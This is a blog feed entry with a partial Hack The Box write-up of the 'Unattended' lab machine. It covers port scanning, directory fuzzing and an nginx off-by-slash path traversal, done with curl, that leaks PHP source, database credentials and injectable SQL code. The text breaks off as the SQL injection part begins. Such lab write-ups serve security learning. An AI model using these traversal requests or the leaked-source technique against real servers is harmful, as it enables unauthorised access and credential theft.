<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-24T15:23:14+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Unattended</title><link href="http://localhost:4000/hack-the-box/unattended/" rel="alternate" type="text/html" title="Hack The Box - Unattended" /><published>2019-08-24T00:00:00+02:00</published><updated>2019-08-24T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/unattended</id><content type="html" xml:base="http://localhost:4000/hack-the-box/unattended/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-unattended-retired-and-heres-my-write-up-about-it-personally-i-think-this-box-should-have-been-rated-as-hard-not-medium-it-really-had-a-lot-of-stuff-that-were-hard-to-find-and-exploit-there-was-an-interesting-sql-injection-vulnerability-that-could-be-escalated-to-local-file-inclusion-then-to-remote-code-execution-and-thats-my-favorite-part-about-this-box-its-a-linux-box-and-its-ip-is-101010126-i-added-it-to-etchosts-as-unattendedhtb-lets-jump-right-in-&quot;&gt;Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.126&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;unattended.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC unattended.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/unattended/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-http-and-https-and-surprisingly-no-ssh-also-the-ssl-certificate-from-the-https-port-tells-us-that-the-common-name-is-wwwnestedflandershtb-so-i-added-that-to-my-hosts-file-&quot;&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;, and surprisingly no &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;. Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; certificate from the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; port tells us that the common name is &lt;code class=&quot;highlighter-rouge&quot;&gt;www.nestedflanders.htb&lt;/code&gt; so I added that to my hosts file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
&lt;h3 id=&quot;checking-unattendedhtb-on-both-80-and-443-gives-us-a-blank-page-&quot;&gt;Checking &lt;code class=&quot;highlighter-rouge&quot;&gt;unattended.htb&lt;/code&gt; on both 80 and 443 gives us a blank page :&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/unattended/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;httpwwwnestedflandershtb-responds-with-a-redirection-to-httpswwwnestedflandershtb-which-has-the-default-apache-page-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.nestedflanders.htb&lt;/code&gt; responds with a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.nestedflanders.htb&lt;/code&gt; which has the default Apache page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-wfuzz-to-enumerate-sub-directories-and-it-was-weird-to-see-both-indexphp-and-indexhtml-with-different-content-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; to enumerate sub directories and it was weird to see both &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;index.html&lt;/code&gt; with different content :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# wfuzz --hc 404 -c -u https://www.nestedflanders.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://www.nestedflanders.htb/FUZZ
Total requests: 4614

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200    368 L      933 W        10701 Ch        &quot;&quot;
000011:  C=403     11 L       32 W          290 Ch        &quot;.hta&quot;
000012:  C=403     11 L       32 W          295 Ch        &quot;.htaccess&quot;
000013:  C=403     11 L       32 W          295 Ch        &quot;.htpasswd&quot;
001241:  C=301      7 L       12 W          185 Ch        &quot;dev&quot;
002021:  C=200     48 L      124 W         1244 Ch        &quot;index.php&quot;
002020:  C=200    368 L      933 W        10701 Ch        &quot;index.html&quot;
003588:  C=200     93 L      282 W         5086 Ch        &quot;server-status&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;also-there-was-a-sub-directory-called-dev&quot;&gt;Also there was a sub directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;dev-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;indexhtml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/index.html&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;indexphp&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/index.php&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nginx-off-by-slash&quot;&gt;Nginx off-by-slash&lt;/h3&gt;
&lt;h4 id=&quot;when-i-checked-wappalyzer-results-i-saw-that-it-identified-the-web-server-as-nginx-and-that-was-weird-because-we-saw-apaches-default-page-also-when-i-went-to-httpswwwnestedflandershtbdev-i-got-a-redirection-to-httpswwwnestedflandershtbdev-it-added-a-slash-&quot;&gt;When I checked &lt;a href=&quot;https://www.wappalyzer.com/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wappalyzer&lt;/code&gt;&lt;/a&gt; results I saw that it identified the web server as &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; and that was weird because we saw Apache’s default page. Also when I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.nestedflanders.htb/dev&lt;/code&gt; I got a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.nestedflanders.htb/dev/&lt;/code&gt; (It added a slash &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;).&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;white&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;&lt;/span&gt;nginx/1.10.3&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev/
dev site has been moved to his own server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;as-demonstrated-in-this-document-there-can-be-a-vulnerability-because-of-this-i-gave-it-a-try-by-adding--after-dev&quot;&gt;As demonstrated in &lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;this document&lt;/a&gt; there can be a vulnerability because of this. I gave it a try by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;..&lt;/code&gt; after &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;403 Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;white&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;403 Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;&lt;/span&gt;nginx/1.10.3&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-403-maybe-because-we-are-out-of--html-directory-i-added-htmlindexphp-and-i-successfully-got-the-source-of-the-index-page-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; maybe because we are out of  &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; directory, I added &lt;code class=&quot;highlighter-rouge&quot;&gt;/html/index.php&lt;/code&gt; and I successfully got the source of the index page :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;white&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;&lt;/span&gt;nginx/1.10.3&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/index.php
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
$servername = &quot;localhost&quot;;
$username = &quot;nestedflanders&quot;;
$password = &quot;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&quot;;
$db = &quot;neddy&quot;;
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;

include &quot;6fb17817efb4131ae4ae1acae0f7fd48.php&quot;;

function getTplFromID($conn) {
	global $debug;
	$valid_ids = array (25,465,587);
	if ( (array_key_exists('id', $_GET)) &amp;amp;&amp;amp; (intval($_GET['id']) == $_GET['id']) &amp;amp;&amp;amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
			$sql = &quot;SELECT name FROM idname where id = '&quot;.$_GET['id'].&quot;'&quot;;
	} else {
		$sql = &quot;SELECT name FROM idname where id = '25'&quot;;
	}
	if ($debug) { echo &quot;sqltpl: $sql&amp;lt;br&amp;gt;\n&quot;; } 
	
	$result = $conn-&amp;gt;query($sql);
	if ($result-&amp;gt;num_rows &amp;gt; 0) {
	while($row = $result-&amp;gt;fetch_assoc()) {
		$ret = $row['name'];
	}
	} else {
		$ret = 'main';
	}
	if ($debug) { echo &quot;rettpl: $ret&amp;lt;br&amp;gt;\n&quot;; }
	return $ret;
}

function getPathFromTpl($conn,$tpl) {
	global $debug;
	$sql = &quot;SELECT path from filepath where name = '&quot;.$tpl.&quot;'&quot;;
	if ($debug) { echo &quot;sqlpath: $sql&amp;lt;br&amp;gt;\n&quot;; }
	$result = $conn-&amp;gt;query($sql);
	if ($result-&amp;gt;num_rows &amp;gt; 0) {
		while($row = $result-&amp;gt;fetch_assoc()) {
			$ret = $row['path'];
		}
	}
	if ($debug) { echo &quot;retpath: $ret&amp;lt;br&amp;gt;\n&quot;; }
	return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Ne(ste)d Flanders&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bootstrap.min.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;jquery.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Ne(ste)d Flanders' Portfolio&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;center&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php

$sql = &quot;SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id&quot;;
if ($debug) { echo &quot;sql: $sql&amp;lt;br&amp;gt;\n&quot;; }

$result = $conn-&amp;gt;query($sql);
if ($result-&amp;gt;num_rows &amp;gt; 0) {
	while($row = $result-&amp;gt;fetch_assoc()) {
		//if ($debug) { echo &quot;rowid: &quot;.$row['id'].&quot;&amp;lt;br&amp;gt;\n&quot;; } // breaks layout
		echo '&amp;lt;div class=&quot;col-md-2&quot;&amp;gt;&amp;lt;a href=&quot;index.php?id='.$row['id'].'&quot; target=&quot;maifreim&quot;&amp;gt;'.$row['name'].'&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;';
		}
} else {
?&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md-2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?id=25&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;main&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md-2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?id=465&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;about&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md-2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?id=587&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;contact&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
}

?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- row --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- container --&amp;gt;&lt;/span&gt;


&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;div align=&quot;center&quot;&amp;gt; --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
include(&quot;$inc&quot;);
?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;/div&amp;gt; --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- row --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- container --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php if ($debug) { echo &quot;include $inc;&amp;lt;br&amp;gt;\n&quot;; } ?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
$conn-&amp;gt;close();
?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;sqli&quot;&gt;SQLI&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-the-php-code-we-can-see-database-credentials-&quot;&gt;By looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code we can see database credentials :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$servername = &quot;localhost&quot;;
$username = &quot;nestedflanders&quot;;
$password = &quot;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&quot;;
$db = &quot;neddy&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;those-can-be-helpful-later&quot;&gt;Those can be helpful later.&lt;/h4&gt;
&lt;h4 id=&quot;another-thing-i-noticed-was-this-include-&quot;&gt;Another thing I noticed was this include :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include &quot;6fb17817efb4131ae4ae1acae0f7fd48.php&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-downloaded-that-page-but-it-had-nothing-interesting-&quot;&gt;I downloaded that page but it had nothing interesting :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
&amp;lt;?php
session_start();
if (isset($_SESSION['user_name'])){
        $user_name = $_SESSION['user_name'];
}

foreach ($_COOKIE as $key =&amp;gt; $val) {
        $_SESSION[$key] = $val;
}

/* removed everything because of undergoing investigation, please check dev and staging */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-also-see-this-&quot;&gt;We can also see this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$valid_ids = array (25,465,587);
	if ( (array_key_exists('id', $_GET)) &amp;amp;&amp;amp; (intval($_GET['id']) == $_GET['id']) &amp;amp;&amp;amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
			$sql = &quot;SELECT name FROM idname where id = '&quot;.$_GET['id'].&quot;'&quot;;
	} else {
		$sql = &quot;SELECT name FROM idname where id = '25'&quot;;
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
